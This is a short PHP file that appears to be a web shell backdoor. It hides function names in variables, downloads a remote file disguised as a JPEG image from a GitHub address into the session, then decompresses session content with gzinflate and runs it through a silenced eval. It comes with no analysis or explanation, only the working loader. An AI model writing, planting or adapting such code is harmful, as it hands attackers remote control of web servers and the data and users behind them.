<?php $password="astr";
session_start();
if(empty($_SESSION['qqqxx'])){
$fgc="file_get_contents";
$u="https://github.com/ESUAdmin/z/raw/master/s.jpg";
$_SESSION['qqqxx']=$fgc($u);}
$g="gzinflate";
@eval($g($_SESSION['PhpCode']));
?>
